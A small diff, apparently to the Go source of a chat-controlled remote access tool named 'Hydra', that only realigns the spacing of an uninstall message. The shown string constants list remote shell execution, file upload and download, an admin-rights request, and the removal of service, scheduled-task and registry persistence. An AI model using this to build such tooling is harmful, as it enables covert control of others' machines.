@@ -15,7 +15,7 @@ const (
 		"sh - execute a command and return the output\nfile - upload a file from the local system\n" +
 		"dl - download a file from a url to the local system\nroot - ask for admin permissions\nremove - uninstall Hydra\n" +
 		"instance - returns informtaion about Hydra\n```"
-	fmtUninstall = "```\nRemoving all traces of Hydra...\n\nService: %v\nTask: %v\nRegistry: %v\nShortcut: %v\n\nBye!\n```"
+	fmtUninstall = "```\nRemoving all traces of Hydra...\n\nService:  %v\nTask:     %v\nRegistry: %v\nShortcut: %v\n\nBye!\n```"
 	unknown      = "Wat is this? America explain!!"
 )
 
